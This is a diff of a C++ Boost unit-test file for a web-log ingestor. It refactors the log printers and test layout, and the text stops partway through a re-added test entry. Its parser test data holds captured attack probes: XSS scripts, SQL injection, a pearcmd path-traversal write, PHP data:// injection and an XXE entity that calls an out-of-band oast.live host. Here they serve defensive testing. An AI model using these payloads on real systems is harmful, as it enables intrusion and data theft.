@@ -1,10 +1,10 @@
 #define BOOST_TEST_MODULE ingest
 #include <boost/test/data/test_case.hpp>
-#include <boost/test/unit_test.hpp>
+#include <boost/test/unit_test.hpp> // IWYU pragma: keep
 
 #include "testing-util.hpp"
 #include <fstream>
-#include <selectcommandUtil.impl.h>
+#include <selectcommandUtil.impl.h> // IWYU pragma: keep
 
 #include <ingestor.hpp>
 #include <ranges>
@@ -42,7 +42,7 @@ namespace {
 	std::optional<EntityWithDetail>
 	getEntityById(DB::Connection * dbconn, EntityId id)
 	{
-		auto select = dbconn->select("SELECT type, value, detail FROM entities WHERE id = ?");
+		const auto select = dbconn->select("SELECT type, value, detail FROM entities WHERE id = ?");
 		select->bindParam(0, id);
 		for (auto [typeStr, value, detail] : select->as<std::string, std::string, std::optional<std::string>>()) {
 			return std::make_optional<EntityWithDetail>(id, toEntityType(typeStr), std::move(value), std::move(detail));
@@ -51,779 +51,825 @@ namespace {
 	}
 }
 
-namespace std {
-	ostream &
-	operator<<(ostream & strm, const EntityType value)
-	{
-		const auto valueNum = static_cast<size_t>(value);
-		std::print(strm, "EntityType: {} ({})", ENTITY_TYPE_NAMES[valueNum], valueNum);
-		return strm;
-	}
-
-	template<typename T>
-	ostream &
-	operator<<(ostream & strm, const std::optional<T> & value)
-	{
-		if (value) {
-			strm << *value;
+namespace boost::test_tools::tt_detail {
+	template<typename T> struct print_log_value<std::optional<T>> {
+		void
+		operator()(std::ostream & strm, const std::optional<T> & value) const
+		{
+			if (value) {
+				print_log_value<T>()(strm, *value);
+			}
 		}
-		return strm;
-	}
+	};
 
-	template<typename... T>
-	ostream &
-	operator<<(ostream & strm, const std::tuple<T...> & values)
-	{
-		return std::apply(
-				[&strm](auto &&... elems) -> decltype(auto) {
-					return ((strm << '{' << elems << ", "), ...) << '}';
-				},
-				values);
-	}
+	template<> struct print_log_value<WebStat::QueryString> : print_log_value<std::optional<std::string>> { };
 
-	template<typename... T>
-	ostream &
-	operator<<(ostream & strm, const DB::Row<T...> & row)
-	{
-		return [&]<size_t... Field>(std::integer_sequence<size_t, Field...>) -> decltype(auto) {
-			return ((strm << '{' << row.template get<Field>() << ", "), ...) << '}';
-		}(std::make_integer_sequence<size_t, sizeof...(T)>());
-	}
+	template<> struct print_log_value<WebStat::CLFString> : print_log_value<std::optional<std::string>> { };
+
+	template<> struct print_log_value<EntityType> {
+		void
+		operator()(std::ostream & strm, const EntityType & value) const
+		{
+			const auto valueNum = static_cast<size_t>(value);
+			std::print(strm, "EntityType: {} ({})", ENTITY_TYPE_NAMES.at(valueNum), valueNum);
+		}
+	};
+
+	template<typename... T> struct print_log_value<std::tuple<T...>> {
+		void
+		operator()(std::ostream & strm, const std::tuple<T...> & value) const
+		{
+			std::apply(
+					[&strm](const T &... elems) {
+						strm << '{';
+						((print_log_value<T> {}(strm, elems), strm << ", "), ...);
+						strm << '}';
+					},
+					value);
+		}
+	};
+
+	template<typename... T> struct print_log_value<DB::Row<T...>> {
+		void
+		operator()(std::ostream & strm, const DB::Row<T...> & value) const
+		{
+			[&]<size_t... Field>(std::integer_sequence<size_t, Field...>) {
+				strm << '{';
+				((print_log_value<T> {}(strm, value.template get<Field>()), strm << ","), ...);
+				strm << '}';
+			}(std::make_integer_sequence<size_t, sizeof...(T)>());
+		}
+	};
 }
 
 namespace DB {
-	template<typename... T>
+	template<typename... Tr, typename... Te>
+		requires(std::equality_comparable_with<Tr, Te> && ...)
 	bool
-	operator!=(const Row<T...> & row, const std::tuple<T...> & expected)
+	// NOLINTNEXTLINE(misc-use-internal-linkage)
+	operator!=(const Row<Tr...> & row, const std::tuple<Te...> & expected)
 	{
 		return [&]<size_t... Field>(std::integer_sequence<size_t, Field...>) {
 			return std::make_tuple(row.template get<Field>()...);
-		}(std::make_integer_sequence<size_t, sizeof...(T)>())
+		}(std::make_integer_sequence<size_t, sizeof...(Tr)>())
 				!= expected;
 	}
 }
 
 BOOST_TEST_DONT_PRINT_LOG_VALUE(Ingestor::Stats);
 
-const std::string badHexIn {
+namespace {
+	// NOLINTBEGIN(bugprone-throwing-static-initialization,clang-diagnostic-c23-extensions)
+	const std::string BAD_HEX_IN {
 #embed "fixtures/badHex.in.txt"
-};
+	};
 #pragma GCC diagnostic push
 #pragma GCC diagnostic ignored "-Wnarrowing"
 #pragma GCC diagnostic ignored "-Wconversion"
-const WebStat::QuotedString badHexExp {
+	const WebStat::QuotedString BAD_HEX_EXP {
 #embed "fixtures/badHex.exp.txt"
-};
+	};
 #pragma GCC diagnostic pop
+	// NOLINTEND(bugprone-throwing-static-initialization,clang-diagnostic-c23-extensions)
 
-BOOST_DATA_TEST_CASE(QuotedStringsGood,
-		boost::unit_test::data::make<WebStat::ParseData<WebStat::QuotedString>>({
-				{R"("")", ""},
-				{R"("-")", "-"},
-				{R"(".")", "."},
-				{R"("/url/path")", "/url/path"},
-				{R"("hex\x41")", "hexA"},
-				{R"("hex\x4141")", "hexA41"},
-				{R"("hex\x41\x41")", "hexAA"},
-				{R"("hex\t\x41")", "hex\tA"},
-				{R"("/packages/dev-php/pecl-uploadprogress(),')\"((,,")",
-						R"LOG(/packages/dev-php/pecl-uploadprogress(),')"((,,)LOG"},
-				{R"("/sra_{BA195980-CD49-458b-9E23-C84EE0ADCD75}/")",
-						R"(/sra_{BA195980-CD49-458b-9E23-C84EE0ADCD75}/)"},
-				{badHexIn, badHexExp},
-		}),
-		input, expected)
-{
-	WebStat::QuotedString result;
-	auto strm {input};
-	BOOST_REQUIRE_NO_THROW(strm >> result);
-	BOOST_CHECK_EQUAL(result, expected);
-}
-
-BOOST_DATA_TEST_CASE(QuotedStringsBad,
-		boost::unit_test::data::make<std::string_view>({
-				R"()",
-				R"(-)",
-				R"(word)",
-				R"(/url/path)",
-		}),
-		input)
-{
-	QuotedString out;
-	auto strm {input};
-	BOOST_REQUIRE_THROW(strm >> out, std::invalid_argument);
-}
-
-BOOST_DATA_TEST_CASE(QueryStringsGood,
-		boost::unit_test::data::make<WebStat::ParseData<WebStat::QueryString>>({
-				{R"("")", std::nullopt},
-				{R"("?")", ""},
-				{R"("?something")", "something"},
-				{R"("?some=thing")", "some=thing"},
-				{R"("?some=thing&other=thing")", "some=thing&other=thing"},
-				{R"("?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php")",
-						R"(lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php)"},
-				{R"("?device=aaaaa:a%27\";user|s.\"1337\";")", R"(device=aaaaa:a%27";user|s."1337";)"},
-				{R"("?destpage=\"<h1xxx\"><script>alert(document.domain)</script>&pagename=OpenMarket%2FXcelerate%2FUIFramework%2FLoginError")",
-						R"(destpage="<h1xxx"><script>alert(document.domain)</script>&pagename=OpenMarket%2FXcelerate%2FUIFramework%2FLoginError)"},
-				{R"("?extension=menu&view=menu&parent=\"%20UNION%20SELECT%20NULL,NULL,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION(),md5(999999999)),NULL,NULL,NULL,NULL,NULL--%20aa")",
-						R"(extension=menu&view=menu&parent="%20UNION%20SELECT%20NULL,NULL,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION(),md5(999999999)),NULL,NULL,NULL,NULL,NULL--%20aa)"},
-				{R"("?h=gentoobrowse-2.0.0_beta7&id=\"><script%20>alert(String.fromCharCode(88,83,83))</script>")",
-						R"(h=gentoobrowse-2.0.0_beta7&id="><script%20>alert(String.fromCharCode(88,83,83))</script>)"},
-				{R"("?h=\"><script%20>alert(String.fromCharCode(88,83,83))</script>&id=d3465d0d00edd302c9d6fc7672a9405921a6a7db")",
-						R"(h="><script%20>alert(String.fromCharCode(88,83,83))</script>&id=d3465d0d00edd302c9d6fc7672a9405921a6a7db)"},
-				{R"("?pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/complexassetmaker&cs_imagedir=qqq\"><script>alert(document.domain)</script>")",
-						R"(pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/complexassetmaker&cs_imagedir=qqq"><script>alert(document.domain)</script>)"},
-				{R"("?p=1&xsg-provider=data://text/html,<?php%20echo%20md5(\"CVE-2022-0346\");%20//&xsg-format=yyy&xsg-type=zz&xsg-page=pp")",
-						R"(p=1&xsg-provider=data://text/html,<?php%20echo%20md5("CVE-2022-0346");%20//&xsg-format=yyy&xsg-type=zz&xsg-page=pp)"},
-				{R"("?action=likebtn_prx&likebtn_q=aHR0cDovL2xpa2VidG4uY29tLm9hc3QubWU=\"")",
-						R"(action=likebtn_prx&likebtn_q=aHR0cDovL2xpa2VidG4uY29tLm9hc3QubWU=")"},
-				{R"("?xml=<%3fxml+version%3d\"1.0\"+%3f><!DOCTYPE+r+[<!ELEMENT+r+ANY+><!ENTITY+%25+sp+SYSTEM+\"http%3a//d68kbl4h7ttk5ft3kh10e3yhnbxkdoni3.oast.live/xxe.xml\">%25sp%3b%25param1%3b]>&_xf=Excel&_xl=123&template=123")",
-						R"(xml=<%3fxml+version%3d"1.0"+%3f><!DOCTYPE+r+[<!ELEMENT+r+ANY+><!ENTITY+%25+sp+SYSTEM+"http%3a//d68kbl4h7ttk5ft3kh10e3yhnbxkdoni3.oast.live/xxe.xml">%25sp%3b%25param1%3b]>&_xf=Excel&_xl=123&template=123)"},
-				{R"("?jvar_page_title=<style><j:jelly%20xmlns:j=\"jelly\"%20xmlns:g=%27glide%27><g:evaluate>gs.addErrorMessage(1337*1337);</g:evaluate></j:jelly></style>")",
-						R"(jvar_page_title=<style><j:jelly%20xmlns:j="jelly"%20xmlns:g=%27glide%27><g:evaluate>gs.addErrorMessage(1337*1337);</g:evaluate></j:jelly></style>)"},
-				{R"("?h=gentoobrowse-api-0.11.2.1&id=\"><script%20>alert(String.fromCharCode(88,83,83))</script>")",
-						R"(h=gentoobrowse-api-0.11.2.1&id="><script%20>alert(String.fromCharCode(88,83,83))</script>)"},
-				{R"("?opcode=cp_preview&bg_color=AA&banner_color=B&banner_text=AAA&terms_of_use=AAA&use_policy=BBB&authenticated=False&decoded_texts=\"%27;%0Aalert(document.domain);//%0a%27")",
-						R"(opcode=cp_preview&bg_color=AA&banner_color=B&banner_text=AAA&terms_of_use=AAA&use_policy=BBB&authenticated=False&decoded_texts="%27;%0Aalert(document.domain);//%0a%27)"},
-				{R"("?wpapp_shortcode=\"%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&wpappninja_simul4=1")",
-						R"(wpapp_shortcode="%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&wpappninja_simul4=1)"},
-				{R"("?post_type=sc_order&order_type=orders&format_err=1\"></script><script>alert(document.domain)</script><script>")",
-						R"(post_type=sc_order&order_type=orders&format_err=1"></script><script>alert(document.domain)</script><script>)"},
-				{R"("?page=ph-settings&ph_message=\"><script>alert(document.domain)</script>")",
-						R"(page=ph-settings&ph_message="><script>alert(document.domain)</script>)"},
-				{R"("?entryPoint=responseEntryPoint&event=1&delegate=a<\"+UNION+SELECT+SLEEP(6);--+-&type=c&response=accept")",
-						R"(entryPoint=responseEntryPoint&event=1&delegate=a<"+UNION+SELECT+SLEEP(6);--+-&type=c&response=accept)"},
-		}),
-		input, expected)
-{
-	WebStat::QueryString result;
-	auto strm {input};
-	BOOST_REQUIRE_NO_THROW(strm >> result);
-	BOOST_CHECK_EQUAL(result, expected);
-}
-
-BOOST_DATA_TEST_CASE(QueryStringsBad,
-		boost::unit_test::data::make<std::string_view>({
-				R"()",
-				R"("-")",
-				R"(".")",
-				R"(-)",
-				R"(word)",
-				R"(/url/path)",
-		}),
-		input)
-{
-	WebStat::QueryString result;
-	auto strm {input};
-	BOOST_REQUIRE_THROW(strm >> result, std::invalid_argument);
-}
-
-BOOST_TEST_DECORATOR(*boost::unit_test::timeout(1))
-
-BOOST_DATA_TEST_CASE(CLFStringsGood,
-		boost::unit_test::data::make<WebStat::ParseData<WebStat::CLFString>>({
-				{R"("")", ""},
-				{R"("-")", std::nullopt},
-				{R"("?")", "?"},
-				{R"(".")", "."},
-				{R"("something")", "something"},
-				{R"("https://google.com")", "https://google.com"},
-				{R"("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")",
-						R"(Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36)"},
-		}),
-		input, expected)
-{
-	WebStat::CLFString result;
-	auto strm {input};
-	BOOST_REQUIRE_NO_THROW(strm >> result);
-	BOOST_CHECK_EQUAL(result, expected);
-}
-
-BOOST_DATA_TEST_CASE(CLFStringsBad,
-		boost::unit_test::data::make<std::string_view>({
-				R"()",
-				R"(-)",
-				R"(word)",
-				R"(/url/path)",
-		}),
-		input)
-{
-	WebStat::QueryString result;
-	auto strm {input};
-	BOOST_REQUIRE_THROW(strm >> result, std::invalid_argument);
-}
-
-constexpr std::string_view LOGLINE1
-		= R"LOG(git.randomdan.homeip.net 98.82.40.168 1755561576768318 GET "/repo/gentoobrowse-api/commit/gentoobrowse-api/unittests/fixtures/756569aa764177340726dd3d40b41d89b11b20c7/app-crypt/pdfcrack/Manifest" "?h=gentoobrowse-api-0.9.1&id=a2ed3fd30333721accd4b697bfcb6cc4165c7714" HTTP/1.1 200 1884 107791 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Amazonbot/0.1; +https://developer.amazon.com/support/amazonbot) Chrome/119.0.6045.214 Safari/537.36" "test/plain")LOG";
-constexpr std::string_view LOGLINE2
-		= R"LOG(www.randomdan.homeip.net 43.128.84.166 1755561575973204 GET "/app-dicts/myspell-et/Manifest" "" HTTP/1.1 200 312 10369 "https://google.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" "image/png")LOG";
-constexpr std::string_view LOGLINE_DUPES
-		= R"LOG(www.randomdan.homeip.net 43.128.84.166 1755561575973204 GET "/app-dicts/myspell-et/Manifest" "" HTTP/1.1 200 312 10369 "www.randomdan.homeip.net" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" "image/png")LOG";
-
-BOOST_TEST_DECORATOR(*boost::unit_test::depends_on("QuotedStringsGood"))
-BOOST_TEST_DECORATOR(*boost::unit_test::depends_on("QueryStringsGood"))
-BOOST_TEST_DECORATOR(*boost::unit_test::depends_on("CLFStringsGood"))
-
-BOOST_DATA_TEST_CASE(ExtractFields,
-		boost::unit_test::data::make<WebStat::ParseData<WebStat::Ingestor::ScanValues>>({
-				{LOGLINE1,
-						{"git.randomdan.homeip.net", "98.82.40.168", 1755561576768318, "GET",
-								R"(/repo/gentoobrowse-api/commit/gentoobrowse-api/unittests/fixtures/756569aa764177340726dd3d40b41d89b11b20c7/app-crypt/pdfcrack/Manifest)",
-								R"(h=gentoobrowse-api-0.9.1&id=a2ed3fd30333721accd4b697bfcb6cc4165c7714)", "HTTP/1.1",
-								200, 1884, 107791, std::nullopt,
-								R"(Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Amazonbot/0.1; +https://developer.amazon.com/support/amazonbot) Chrome/119.0.6045.214 Safari/537.36)",
-								"test/plain"}},
-				{LOGLINE2,
-						{"www.randomdan.homeip.net", "43.128.84.166", 1755561575973204, "GET",
-								"/app-dicts/myspell-et/Manifest", std::nullopt, "HTTP/1.1", 200, 312, 10369,
-								"https://google.com",
-								R"(Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36)",
-								"image/png"}},
-		}),
-		input, expected)
-{
-	const auto result = WebStat::Ingestor::scanLogLine(input);
-	BOOST_REQUIRE(result);
-	BOOST_CHECK_EQUAL(*result, expected);
-}
-
-BOOST_AUTO_TEST_CASE(ExtractFieldsEdgeCasesUnparsable3580673700)
-{
-	const auto result = WebStat::Ingestor::scanLogLine(
-			R"LOG(gentoobrowse.randomdan.homeip.net 5.183.129.58 1759960912510520 GET "/packages/dev-php/pecl-uploadprogress(),')\"((,," "" HTTP/1.1 404 0 10051 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" "-")LOG");
-	BOOST_REQUIRE(result);
-	BOOST_CHECK_EQUAL(std::get<4>(*result), R"LOG(/packages/dev-php/pecl-uploadprogress(),')"((,,)LOG");
-}
-
-BOOST_AUTO_TEST_CASE(ExtractFieldsEdgeCasesUnparsable3603068405)
-{
-	const auto result = WebStat::Ingestor::scanLogLine(
-			R"LOG(gentoobrowse.randomdan.homeip.net 5.183.129.58 1759960912705682 GET "/packages/dev-php/pecl-uploadprogress'yqFSRA<'\">yuezhx" "" HTTP/1.1 404 0 19143 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" "-")LOG");
-	BOOST_REQUIRE(result);
-	BOOST_CHECK_EQUAL(std::get<4>(*result), R"LOG(/packages/dev-php/pecl-uploadprogress'yqFSRA<'">yuezhx)LOG");
-}
-
-BOOST_AUTO_TEST_CASE(ExtractFieldsEdgeCasesUnparsable3482917779)
-{
-	const auto result = WebStat::Ingestor::scanLogLine(
-			R"LOG(195.166.151.214 62.171.174.195 1774536220216585 GET "/index.php" "?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php" HTTP/1.1 404 376 5811 "-" "libredtail-http" "text/html")LOG");
-	BOOST_REQUIRE(result);
-	const auto queryString = std::get<5>(*result);
-	BOOST_REQUIRE(queryString);
-	BOOST_CHECK_EQUAL(*queryString,
-			R"LOG(lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php)LOG");
-}
-
-BOOST_AUTO_TEST_CASE(ExtractFieldsEdgeCasesUnparsable3354288) // Long duration
-{
-	const auto result = WebStat::Ingestor::scanLogLine(
-			R"LOG(git.randomdan.homeip.net 216.73.216.212 1770062062011035 GET "/repo/netfs/patch/libfusepp" "?id=46f6aa3507120f4b69a54abc02d8829eac005b6f" HTTP/2.0 200 1 7361204168 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; ClaudeBot/1.0; +claudebot@anthropic.com)" "text/plain")LOG");
-	BOOST_REQUIRE(result);
-	const auto duration = std::get<9>(*result);
-	BOOST_CHECK_EQUAL(7361204168, duration);
-}
-
-class TestIngestor : public WebStat::BasicTestIngestor {
-public:
-	TestIngestor() : WebStat::BasicTestIngestor {"test-hostname"} { }
-
-	[[gnu::format(printf, 3, 4)]] void
-	log(int, const char * msgfmt, ...) const override
+	BOOST_DATA_TEST_CASE(QuotedStringsGood,
+			boost::unit_test::data::make<WebStat::ParseData<WebStat::QuotedString>>({
+					{R"("")", ""},
+					{R"("-")", "-"},
+					{R"(".")", "."},
+					{R"("/url/path")", "/url/path"},
+					{R"("hex\x41")", "hexA"},
+					{R"("hex\x4141")", "hexA41"},
+					{R"("hex\x41\x41")", "hexAA"},
+					{R"("hex\t\x41")", "hex\tA"},
+					{R"("/packages/dev-php/pecl-uploadprogress(),')\"((,,")",
+							R"LOG(/packages/dev-php/pecl-uploadprogress(),')"((,,)LOG"},
+					{R"("/sra_{BA195980-CD49-458b-9E23-C84EE0ADCD75}/")",
+							R"(/sra_{BA195980-CD49-458b-9E23-C84EE0ADCD75}/)"},
+					{BAD_HEX_IN, BAD_HEX_EXP},
+			}),
+			input, expected)
 	{
-		va_list args;
-		va_start(args, msgfmt);
-		std::unique_ptr<char, DeleteWith<&free>> msg;
-		BOOST_REQUIRE_GE(vasprintf(std::out_ptr(msg), msgfmt, args), 0);
-		va_end(args);
-		BOOST_REQUIRE(msg);
-		BOOST_TEST_MESSAGE(msg.get());
-		++logsWritten;
+		WebStat::QuotedString result;
+		auto strm {input};
+		BOOST_REQUIRE_NO_THROW(strm >> result);
+		BOOST_CHECK_EQUAL(result, expected);
 	}
-};
 
-static constexpr std::array<std::string_view, 9> ENTITY_TYPE_VALUES {{
-		{"host"},
-		{"virtual_host"},
-		{"path"},
-		{"query_string"},
-		{"referrer"},
-		{"user_agent"},
-		{"unparsable_line"},
-		{"uninsertable_line"},
-		{"content_type"},
-}};
-
-BOOST_FIXTURE_TEST_SUITE(I, TestIngestor);
-BOOST_TEST_DECORATOR(*boost::unit_test::depends_on("ExtractFields"))
-
-using StoreLogLineData = std::tuple<std::string_view, size_t>;
-
-BOOST_DATA_TEST_CASE(StoreLogLine,
-		boost::unit_test::data::make<StoreLogLineData>({
-				{LOGLINE1, 5},
-				{LOGLINE2, 7},
-		}),
-		lineIn, entities)
-{
-	const std::string line {lineIn};
-	ingestLogLines(DB::MockDatabase::openConnectionTo("webstat").get(), {&line, 1});
-	BOOST_CHECK_EQUAL(stats.linesRead, 0);
-	BOOST_CHECK_EQUAL(stats.linesParsed, 1);
-	BOOST_CHECK_EQUAL(stats.linesParseFailed, 0);
-	BOOST_CHECK_EQUAL(stats.logsInserted, 1);
-	BOOST_CHECK_EQUAL(stats.entitiesInserted, entities);
-	BOOST_CHECK_EQUAL(existingEntities->size(), 5);
-}
-
-BOOST_AUTO_TEST_CASE(StoreLogLines_WithDuplicateOfDifferentType, *boost::unit_test::depends_on("I/StoreLogLine"))
-{
-	const std::vector lines {std::string {LOGLINE1}, std::string {LOGLINE2}, std::string {LOGLINE_DUPES}};
-	ingestLogLines(DB::MockDatabase::openConnectionTo("webstat").get(), lines);
-	BOOST_CHECK_EQUAL(stats.linesRead, 0);
-	BOOST_CHECK_EQUAL(stats.linesParsed, 3);
-	BOOST_CHECK_EQUAL(stats.linesParseFailed, 0);
-	BOOST_CHECK_EQUAL(stats.logsInserted, 3);
-	BOOST_CHECK_EQUAL(stats.entitiesInserted, 13);
-	BOOST_CHECK_EQUAL(existingEntities->size(), 11);
-}
-
-BOOST_AUTO_TEST_CASE(StoreLog, *boost::unit_test::depends_on("I/StoreLogLine"))
-{
-	WebStat::LogFile log {"/tmp/store-log-fixture.log", 10};
-	std::ifstream input {log.path};
-	BOOST_REQUIRE(input.good());
-	BOOST_CHECK_NO_THROW(ingestLog(input));
-	BOOST_CHECK_EQUAL(stats.linesRead, 10);
-	BOOST_CHECK_LE(stats.linesParsed, 10);
-	BOOST_CHECK_EQUAL(stats.linesParseFailed, 0);
-	BOOST_CHECK_GT(stats.linesParked, 0);
-	BOOST_CHECK_GE(stats.entitiesInserted, 1);
-	BOOST_CHECK_EQUAL(stats.linesParked + stats.logsInserted, 10);
-	BOOST_CHECK_EQUAL(stats.entitiesInserted, existingEntities->size());
-}
-
-BOOST_AUTO_TEST_CASE(TerminateHandler, *boost::unit_test::timeout(5))
-{
-	std::ifstream input {"/dev/null"};
-	BOOST_REQUIRE(input.good());
-	BOOST_REQUIRE(!terminated);
-	raise(SIGTERM);
-	BOOST_REQUIRE(terminated);
-	ingestLog(input);
-	BOOST_CHECK_EQUAL(stats.linesRead, 0);
-	BOOST_CHECK_EQUAL(stats.linesParsed, 0);
-	BOOST_CHECK_EQUAL(stats.linesParseFailed, 0);
-}
-
-BOOST_AUTO_TEST_CASE(ParkLogLine)
-{
-	queuedLines.emplace_back(LOGLINE1);
-	queuedLines.emplace_back(LOGLINE2);
-	const auto path = parkLogLines(queuedLines);
-	BOOST_REQUIRE(path);
-	BOOST_TEST_INFO(*path);
-	BOOST_REQUIRE(std::filesystem::exists(*path));
-	BOOST_CHECK_EQUAL(std::filesystem::file_size(*path), LOGLINE1.length() + LOGLINE2.length() + 4);
-	BOOST_CHECK_EQUAL(stats.linesParked, 2);
-}
-
-BOOST_AUTO_TEST_CASE(ParkLogLineOnError, *boost::unit_test::depends_on("I/ParkLogLine"))
-{
-	BOOST_REQUIRE(existingEntities->empty());
-	static constexpr std::string UNPARSABLE_LINE = "UNPARSABLE";
-	BOOST_REQUIRE_NO_THROW(ingestLogLines(dbpool->get().get(), {&UNPARSABLE_LINE, 1}));
-	BOOST_CHECK_EQUAL(stats.linesParseFailed, 1);
-	BOOST_CHECK(existingEntities->empty());
-}
-
-BOOST_AUTO_TEST_CASE(IngestParked, *boost::unit_test::depends_on("I/ParkLogLine"))
-{
-	queuedLines.emplace_back(LOGLINE1);
-	queuedLines.emplace_back(LOGLINE2);
-	BOOST_REQUIRE(parkLogLines(queuedLines));
-	BOOST_CHECK(!std::filesystem::is_empty(settings.fallbackDir));
-	BOOST_REQUIRE(queuedLines.empty());
-	const auto result = jobReadParkedLines();
-	BOOST_REQUIRE(result);
-	BOOST_CHECK_EQUAL(result(), 2);
-	BOOST_CHECK_EQUAL(queuedLines.size(), 2);
-	BOOST_CHECK(std::filesystem::is_empty(settings.fallbackDir));
-}
-
-BOOST_AUTO_TEST_CASE(DefaultLaunchNoJobs)
-{
-	runJobsAsNeeded();
-	BOOST_REQUIRE(!ingestParkedLines.currentRun);
-	BOOST_REQUIRE(!purgeOldLogs.currentRun);
-}
-
-BOOST_AUTO_TEST_CASE(IngestParkedJob,
-		*boost::unit_test::depends_on("I/IngestParked") * boost::unit_test::depends_on("I/DefaultLaunchNoJobs"))
-{
-	const auto now = Job::LastRunTime::clock::now();
-	ingestParkedLines.lastRun = now - 1s;
-	queuedLines.emplace_back(LOGLINE1);
-	const auto path = parkLogLines(queuedLines);
-	BOOST_REQUIRE(path);
-	BOOST_REQUIRE(queuedLines.empty());
-	BOOST_REQUIRE(std::filesystem::exists(*path));
-
-	runJobsAsNeeded();
-	BOOST_REQUIRE(!ingestParkedLines.currentRun);
-	BOOST_CHECK(queuedLines.empty());
-	BOOST_CHECK(std::filesystem::exists(*path));
-	BOOST_CHECK_EQUAL(ingestParkedLines.lastRun, now - 1s);
-
-	ingestParkedLines.lastRun = now - settings.freqIngestParkedLines + 2s;
-	runJobsAsNeeded();
-	BOOST_REQUIRE(!ingestParkedLines.currentRun);
-	BOOST_CHECK(queuedLines.empty());
-	BOOST_CHECK(std::filesystem::exists(*path));
-	BOOST_CHECK_EQUAL(ingestParkedLines.lastRun, now - settings.freqIngestParkedLines + 2s);
-
-	ingestParkedLines.lastRun = now - settings.freqIngestParkedLines - 1s;
-	runJobsAsNeeded();
-	BOOST_REQUIRE(ingestParkedLines.currentRun);
-	ingestParkedLines.currentRun->wait();
-	runJobsAsNeeded();
-	BOOST_REQUIRE(!ingestParkedLines.currentRun);
-	BOOST_CHECK_EQUAL(queuedLines.size(), 1);
-	BOOST_CHECK_GE(ingestParkedLines.lastRun, now);
-	BOOST_CHECK(!std::filesystem::exists(*path));
-}
-
-BOOST_AUTO_TEST_CASE(JobErrorRescheduler, *boost::unit_test::depends_on("I/IngestParkedJob"))
-{
-	const auto now = Job::LastRunTime::clock::now();
-	ingestParkedLines.lastRun = now - settings.freqIngestParkedLines - 1s;
-	queuedLines.emplace_back(LOGLINE1);
-	const auto path = parkLogLines(queuedLines);
-	BOOST_REQUIRE(path);
-	std::filesystem::permissions(*path, std::filesystem::perms::owner_write);
-	runJobsAsNeeded();
-	BOOST_REQUIRE(ingestParkedLines.currentRun);
-	ingestParkedLines.currentRun->wait();
-	runJobsAsNeeded();
-	BOOST_REQUIRE(!ingestParkedLines.currentRun);
-	BOOST_CHECK(std::filesystem::exists(*path));
-	BOOST_CHECK_GE(ingestParkedLines.lastRun, now - (settings.freqIngestParkedLines / 2) - 1s);
-	BOOST_CHECK_LE(ingestParkedLines.lastRun, now - (settings.freqIngestParkedLines / 2) + 1s);
-}
-
-BOOST_AUTO_TEST_CASE(FetchMockUserAgentDetail)
-{
-	const auto uaDetailReq = WebStat::curlGetUserAgentDetail(0,
-			R"(Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36)",
-			settings.userAgentAPI.c_str());
-	BOOST_REQUIRE(uaDetailReq);
-	BOOST_REQUIRE_EQUAL(CURLE_OK, curl_easy_perform(uaDetailReq->hnd.get()));
-
-	BOOST_TEST_CONTEXT(uaDetailReq->result) {
-		BOOST_CHECK(uaDetailReq->result.contains(R"("agent_type":)"));
-		BOOST_CHECK(uaDetailReq->result.contains(R"("os_type":)"));
-		BOOST_CHECK(uaDetailReq->result.contains(R"("Chrome")"));
+	BOOST_DATA_TEST_CASE(QuotedStringsBad,
+			boost::unit_test::data::make<std::string_view>({
+					R"()",
+					R"(-)",
+					R"(word)",
+					R"(/url/path)",
+			}),
+			input)
+	{
+		QuotedString out;
+		auto strm {input};
+		BOOST_REQUIRE_THROW(strm >> out, std::invalid_argument);
 	}
-}
 
-constexpr EntityId rollingEntityCounterBase = 15;
+	BOOST_DATA_TEST_CASE(QueryStringsGood,
+			boost::unit_test::data::make<WebStat::ParseData<WebStat::QueryString>>({
+					{R"("")", std::nullopt},
+					{R"("?")", ""},
+					{R"("?something")", "something"},
+					{R"("?some=thing")", "some=thing"},
+					{R"("?some=thing&other=thing")", "some=thing&other=thing"},
+					{R"("?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php")",
+							R"(lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php)"},
+					{R"("?device=aaaaa:a%27\";user|s.\"1337\";")", R"(device=aaaaa:a%27";user|s."1337";)"},
+					{R"("?destpage=\"<h1xxx\"><script>alert(document.domain)</script>&pagename=OpenMarket%2FXcelerate%2FUIFramework%2FLoginError")",
